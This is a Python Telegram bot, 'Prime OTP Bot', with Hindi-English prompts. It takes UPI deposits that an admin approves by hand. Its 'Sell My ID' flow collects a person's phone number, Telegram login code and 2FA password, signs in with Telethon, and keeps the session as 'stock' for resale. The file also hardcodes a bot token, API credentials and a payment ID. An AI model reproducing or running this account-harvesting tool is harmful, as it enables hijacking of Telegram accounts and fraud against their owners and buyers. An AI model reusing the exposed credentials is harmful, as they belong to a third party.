import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import time
import os
from flask import Flask
from threading import Thread

# --- RENDER PORT FIX (FLASK) ---
app = Flask('')
@app.route('/')
def home():
    return "Bot is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'

bot = telebot.TeleBot(TOKEN)
active_clients = {} 
db = {
    'users': {}, 
    'admins': [7634311488], 
    'stock': [],
    'buy_rates': {'India': 10, 'USA': 50, 'Russia': 30}
}

UPI_ID = "abhay-op.315@ptyes"

def is_admin(uid): return uid in db['admins']

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('📲 Start Login', '💰 Balance', '📥 Deposit', '📤 Sell My ID')
    if is_admin(uid): markup.add('/admin')
    bot.send_message(message.chat.id, "🔥 Prime OTP Bot ready hai!", reply_markup=markup)

# --- DEPOSIT SYSTEM (Approve/Reject + 12 Digit UTR) ---
@bot.message_handler(func=lambda message: message.text == '📥 Deposit')
def dep_1(message):
    msg = bot.send_message(message.chat.id, "💰 Amount likho:")
    bot.register_next_step_handler(msg, dep_2)

def dep_2(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 Pay ₹{amt} to `{UPI_ID}`\n\nAb 12-digit **UTR** bhejo:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, dep_3, amt)
    except: bot.send_message(message.chat.id, "❌ Sirf number dalo!")

def dep_3(message, amt):
    utr = message.text.strip()
    if len(utr) != 12:
        msg = bot.send_message(message.chat.id, "❌ UTR 12 digit ka hona chahiye. Phir se bhejo:")
        return bot.register_next_step_handler(msg, dep_3, amt)
    msg = bot.send_message(message.chat.id, "📸 Payment Screenshot bhejo:")
    bot.register_next_step_handler(msg, dep_request, amt, utr)

def dep_request(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "❌ Photo bhejo!")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"app_{message.from_user.id}_{amt}"),
               types.InlineKeyboardButton("❌ Reject", callback_data=f"rej_{message.from_user.id}"))
    for adm in db['admins']:
        bot.send_message(adm, f"🔔 *Deposit Request!*\nID: `{message.from_user.id}`\nAmt: ₹{amt}\nUTR: {utr}")
        bot.send_photo(adm, message.photo[-1].file_id, reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Admin verification ka wait karein.")

@bot.callback_query_handler(func=lambda call: call.data.startswith(('app_', 'rej_')))
def handle_dep(call):
    d = call.data.split('_')
    uid = int(d[1])
    if d[0] == 'app':
        amt = int(d[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ Approved! ₹{amt} added.")
    else: bot.send_message(uid, "❌ Rejected!")
    bot.edit_message_caption(f"Status: {d[0]}", call.message.chat.id, call.message.message_id)

# --- AUTO-LOGIN SELLER & BUYER ACTIONS ---
@bot.message_handler(func=lambda message: message.text == '📤 Sell My ID')
def sell_start(message):
    msg = bot.send_message(message.chat.id, "📞 ID Number bhejo (+91...):")
    bot.register_next_step_handler(msg, process_sell_num)

def process_sell_num(message):
    phone = message.text.replace(" ", "")
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    asyncio.run(connect_seller(message.chat.id, phone, client))

async def connect_seller(chat_id, phone, client):
    await client.connect()
    try:
        req = await client.send_code_request(phone)
        msg = bot.send_message(chat_id, "📩 Seller, OTP bhejo:")
        bot.register_next_step_handler(msg, process_sell_otp, client, phone, req.phone_code_hash)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def process_sell_otp(message, client, phone, hash):
    otp = message.text.strip()
    asyncio.run(finish_seller_login(message.chat.id, otp, client, phone, hash))

async def finish_seller_login(chat_id, otp, client, phone, hash):
    try:
        await client.sign_in(phone, otp, phone_code_hash=hash)
        db['stock'].append({'phone': phone})
        bot.send_message(chat_id, "✅ ID Login & Stock mein add ho gayi!")
        await client.disconnect()
    except SessionPasswordNeededError:
        msg = bot.send_message(chat_id, "🔐 2FA Password bhejo:")
        bot.register_next_step_handler(msg, process_sell_2fa, client)
    except Exception as e: bot.send_message(chat_id, f"❌ Fail: {e}")

def process_sell_2fa(message, client):
    pw = message.text.strip()
    asyncio.run(client.sign_in(password=pw))
    bot.send_message(message.chat.id, "✅ 2FA Success!")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "👑 `/addbal ID Amt`\n`/cutbal ID Amt`\n`/setrate Country Amt`", parse_mode="Markdown")

# --- MAIN START ---
if __name__ == "__main__":
    keep_alive() # Render fix
    print("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=2)
        except Exception:
            time.sleep(5)
